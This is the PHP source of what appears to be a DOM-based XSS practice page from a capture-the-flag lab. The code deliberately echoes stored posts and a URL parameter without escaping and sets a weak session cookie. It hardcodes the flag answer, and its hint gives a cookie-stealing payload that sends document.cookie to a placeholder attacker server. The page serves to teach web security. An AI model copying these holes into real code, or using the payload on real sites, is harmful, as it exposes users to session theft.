<?php
// 커스텀 세션 ID 설정 (기존 PHP 세션을 비활성화하고 커스텀 세션 사용)
ini_set('session.use_cookies', 0);        
ini_set('session.use_only_cookies', 0);   
ini_set('session.use_trans_sid', 1);      

if (session_id()) {
    session_unset();
    session_destroy();
}

// 커스텀 세션 ID 생성
$customSessionID = str_shuffle('ReverseAdmin'); 
session_id($customSessionID);
session_start();

setcookie("AnagramSession", $customSessionID, 0, '/', '', false, false); // 커스텀 세션 쿠키 설정

$uploadDir = './.uploads/'; // 게시글이 저장될 디렉터리
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true); // 디렉터리 생성
}

// 새로운 게시글 저장 처리
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['title']) && isset($_POST['content'])) {
    // 게시글 제목에서 파일명에 적합하지 않은 문자를 제거
    $title = preg_replace("/[^a-zA-Z0-9_\-]/", "_", $_POST['title']);
    $filename = $uploadDir . $title . '.txt'; // 제목을 파일명으로 사용

    // 게시글 내용 저장 
    $content = $_POST['content'];
    $contentToSave = "Title: " . $_POST['title'] . "\nContent: " . $content;
    file_put_contents($filename, $contentToSave);
    header('Location: Complex_xss.php');
    exit();
}

// 업로드된 파일 목록 불러오기
$fileList = array_diff(scandir($uploadDir), array('..', '.'));

// 플래그 처리 로직
$flagMessage = '';
$correctFlag = 'XSS_CTF-flag-Done'; // 정답 플래그
$flagCorrect = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['flag'])) {
    $submittedFlag = $_POST['flag'];
    if ($submittedFlag === $correctFlag) {
        // 정답인 경우
        $flagMessage = '<p style="color:green;">Well done! This is DOM-based XSS Attack!</p>';
	$flagCorrect = true;
    } else {
        // 오답인 경우
        $flagMessage = '<p style="color:red;">Not this flag... try again~</p>';
    }
}
?>
        <script>
                function toggleDescription(id) {
                        var element = document.getElementById(id);

                        var isCurrentlyVisible = element.style.display === "block";

                        var descriptions = document.getElementsByClassName('xss-description');
                        for (var i = 0; i < descriptions.length; i++) {
                                descriptions[i].style.display = 'none';
                        }

                        if (!isCurrentlyVisible) {
                                element.style.display = "block";
                        }
                        
                }
        </script>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Communication Page(DOM-Based XSS)</title>
    <link rel="stylesheet" href="../../assets/css/styles.css">
    <style>
		.xss-type {
                        cursor: pointer;
                        color: #007bff;
                        text-decoration: underline;
                        margin: 10px 0;
                }

                .xss-description {
                        display: none;
                        margin-top: 10px;
                        padding: 10px;
                        background-color: #f9f9f9;
			border-left: 4px solid #007bff;
		}
		footer {
		    background: #35424a;
		    color: #ffffff;
		    text-align: center;
		    padding: 10px;
		    margin-top: 20px;
		    position: sticky;
		    width: 100%;
		    bottom: 0;
		}

    </style>
</head>
<body>
    <div class="wrapper">
        <header>
            <div class="container">
		<h1>User Communication Page</h1>
		<h2>(DOM-Based XSS)</h2>
                <ul>
                    <li><a href="../../index.php">Home</a></li>
                </ul>
            </div>
        </header>

        <div class="container">
            <h2>Create a New Post</h2>
            <form method="POST" action="Complex_xss.php">
                <input type="text" name="title" placeholder="Post Title" required><br>
                <textarea name="content" rows="4" cols="50" placeholder="Write your message here..." required></textarea><br>
                <button type="submit">Submit</button>
            </form>

            <h2>Uploaded Files</h2>
            <ul>
                <?php foreach ($fileList as $file): ?>
                    <li>
			<a href="Complex_xss.php?file=<?php echo urlencode($file); ?>"><?php echo $file; ?></a>
                    </li>
                <?php endforeach; ?>
            </ul>

<?php
// 게시글 내용 출력 (스크립트가 실행될 수 있도록 처리)
if (isset($_GET['file']) && in_array($_GET['file'], $fileList)) {
    $selectedFile = $uploadDir . $_GET['file'];
    $content = file_get_contents($selectedFile);

    // 스크립트를 실행할 수 있는 HTML 처리 방식으로 변경
    echo '<div class="comment-section">';
    echo '<h3>File Content:</h3>';
    echo '<div id="output" style="border: 1px solid #ccc; padding: 10px;">' . $content . '</div>';
    echo '</div>';
}

if (isset($_GET['reflected_input'])) {
	$reflectedInput = $_GET['reflected_input'];
	echo '<p>Reflected Input: ' . $reflectedInput . '</p>';
}
?>
	    <!-- 추가된 버튼들 -->
            <div style="text-align: center">
		<!-- QnA 관리 페이지로 이동 -->
		<button onclick="location.href='QnA_manage.php'">QnA Management</button>

		<!-- C&C 서버 페이지로 이동 -->
                <button onclick="location.href='cc_server.php'">C&C Server</button>
            </div>
	</div>

		 <!-- 플래그 입력란 및 처리 -->
            <div class="flag-section" style="text-align: center ; margin-top: 20px;">
		<h2>Enter the Flag</h2>
		<?php if (!$flagCorrect): ?>
                <form method="POST" action="Complex_xss.php">
                    <input type="text" name="flag" placeholder="Enter your flag here" required />
                    <button type="submit">Submit</button>
		</form>
		<?php endif; ?>
                <!-- 플래그 결과 메시지 출력 -->
                <?php echo $flagMessage; ?>
            </div>
		<!-- Hint! -->
            <div class="xss-type" onclick="toggleDescription('DOM_based')">Hint</div>
            <div id="DOM_based" class="xss-description">
		<p>DOM-Based XSS를 실습하기위한 페이지로서, 운영자와 1:1문의 상황을 가정한 테스트페이지입니다.</p>&lt;a href="#" onclick="var img = new Image(); img.src='http://[your IP Addr]/xss/stage2/cc_server.php?cookie='+document.cookie;"&gt;Click me!&lt;/a&gt;
<p>위 URL을 업로드해, DOM-Based XSS의 공격과정을 실습해보세요.</p>
            </div>
        </div>


	<footer>
            <p>Web Vulnerability Practice &copy; 2024</p>
        </footer>
</body>
</html>


